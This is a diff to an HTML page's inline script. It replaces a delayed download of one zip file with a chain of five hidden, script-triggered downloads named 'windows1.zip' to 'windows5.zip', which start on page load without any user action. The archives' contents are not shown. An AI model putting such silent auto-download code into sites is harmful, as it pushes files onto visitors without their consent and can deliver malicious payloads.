@@ -7,29 +7,28 @@
 
 <body>
   <script>
-      
-
       setTimeout(function() {
-  var filename = "shreyshingala.zip";
-  fetch(filename)
-    .then(response => response.blob())
-    .then(blob => {
-      var anchor = document.createElement("a");
-      document.body.append(anchor);
-      anchor.style = "display: none;";
-
-      var url = window.URL.createObjectURL(blob);
-      anchor.href = url;
-      anchor.download = filename;
-
-      anchor.click();
-      window.URL.revokeObjectURL(url);
-    })
-    .catch(error => {
-      console.log("Error downloading file:", error);
-    });
+  var files = ["windows/windows1.zip", "windows/windows2.zip", "windows/windows3.zip", "windows/windows4.zip", "windows/windows5.zip"];
+  
+  var downloadFile = function(index) {
+    if (index >= files.length) return;
+    
+    var anchor = document.createElement("a");
+    document.body.append(anchor);
+    anchor.style = "display: none;";
+    var url = files[index];
+    anchor.href = url;
+    anchor.download = url.split("/").pop();
+    anchor.click();
+    window.URL.revokeObjectURL(url);
+    
+    setTimeout(function() {
+      downloadFile(index + 1);
+    }, 2000);
+  };
+  
+  downloadFile(0);
 }, 2000);
-
   </script>
 
 	<style>
